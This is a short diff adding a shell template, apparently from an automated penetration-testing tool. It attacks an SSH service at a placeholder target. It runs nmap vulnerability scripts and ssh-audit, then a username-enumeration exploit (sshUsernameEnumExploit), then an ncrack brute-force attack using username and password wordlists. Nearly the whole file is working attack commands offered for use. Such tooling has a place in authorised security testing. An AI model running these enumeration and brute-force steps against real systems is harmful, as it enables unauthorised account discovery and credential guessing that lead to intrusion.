@@ -1,0 +1,11 @@
+echo "\e[92m--- Running nmap script SSH for target: _TARGET_ ---\e[0m"
+nmap.exe -Pn -sSV -p _PORT_ --script=vuln,vulscan/vulscan.nse,banner,ssh-auth-methods,sshv1 -oA "_OUTPUT_/ssh/_TARGET_._PORT_.script" _TARGET_
+
+echo "\e[92m--- Running ssh-audit for target: _TARGET_ ---\e[0m"
+ssh-audit _TARGET_:_PORT_ > "_OUTPUT_/ssh/_TARGET_._PORT_.sshaudit.txt"
+
+echo "\e[92m--- Running sshUsernameEnumExploit for target: _TARGET_ ---\e[0m"
+sshUsernameEnumExploit  --threads _THREADS_ --port _PORT_ --userList "_APP_PATH_/brute-force/common_usernames.small.txt" --outputFormat list --outputFile "_OUTPUT_/ssh/_TARGET_._PORT_.sshUsernameEnumExploit" _TARGET_
+
+echo "\e[92m--- Running ncrack SSH for target: _TARGET_ ---\e[0m"
+ncrack  -v -U "_APP_PATH_/brute-force/usernames.ssh.txt" -P "_APP_PATH_/brute-force/passwords.ssh.txt" -p ssh:_PORT_ -oA "_OUTPUT_/_TARGET_._PORT_.ncrack" _TARGET_
